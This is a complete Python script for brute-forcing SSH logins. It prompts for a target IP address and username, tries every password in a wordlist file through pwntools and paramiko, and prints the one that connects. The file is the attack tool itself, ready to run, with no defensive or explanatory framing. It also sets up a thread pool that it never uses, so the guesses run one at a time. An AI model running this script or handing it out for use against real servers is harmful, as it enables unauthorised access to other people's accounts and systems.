import paramiko
from concurrent.futures import ThreadPoolExecutor
from pwn import *
import re


def is_valid_ip(ip):
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return pattern.match(ip) is not None


host = input("Enter the IP address of the SSH server: ")

while not is_valid_ip(host):
    host = input("Invalid IP address. Please enter a valid IP address: ")

username = input("Enter the username: ")
timeout = 5
password_found = False


def try_password(password):
    global password_found
    if not password_found:
        try:
            response = ssh(host=host, user=username, password=password, timeout=timeout)
            if response.connected:
                password_found = True
                print("[+] Connected")
                print(f"Password found! Password: {password}")
        except paramiko.ssh_exception.AuthenticationException:
            pass
        except paramiko.ssh_exception.SSHException:
            pass


def progress_bar(total_attempts, current_attempt):
    bar_length = 50
    progress = current_attempt / total_attempts
    arrow = "==>"
    filled_length = int(progress * bar_length)
    bar = f"\r\033[0;32m[{'=' * filled_length}{arrow}{' ' * (bar_length - filled_length)}]\033[0m"
    percent = f" {int(progress * 100)}%"
    print(f"{bar} {percent}", end="", flush=True)


with ThreadPoolExecutor(max_workers=10) as executor:
    with open("password.txt", "r") as word_list:
        passwords = [password.strip() for password in word_list]
        total_attempts = len(passwords)
        for i, password in enumerate(passwords, start=1):
            progress_bar(total_attempts, i)
            try_password(password)
            if password_found:
                break
        if not password_found:
            print("\r\n\n[-] Password not present in the wordlist.")
